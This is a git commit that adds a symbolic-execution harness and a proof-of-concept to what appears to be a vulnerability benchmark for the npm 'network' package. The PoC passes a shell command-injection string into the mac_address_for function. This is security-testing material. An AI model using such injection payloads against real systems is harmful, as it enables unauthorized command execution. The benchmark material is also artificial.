9b0ecb3695a6f3b836c9ba41c41299ac5cc30bb4
Filipe Marques <filipe.s.marques@tecnico.ulisboa.pt>
2026-05-18 11:52:37 +0100

    network-0.6.1: complete and verified

---
+++ bench/packages/network-0.6.1/harness.js
@@ -0,0 +1,5 @@
+var esl = require("esl_symbolic");
+var PUT = require('network');
+var x0 = esl.string("payload");
+var x1 = "{}";
+new PUT["mac_address_for"](x0,x1);
---
+++ bench/packages/network-0.6.1/poc.js
@@ -0,0 +1,4 @@
+var PUT = require('network');
+var x0 = " $(touch success) # \" || touch success # ' || touch success";
+var x1 = "{}";
+new PUT["mac_address_for"](x0,x1);
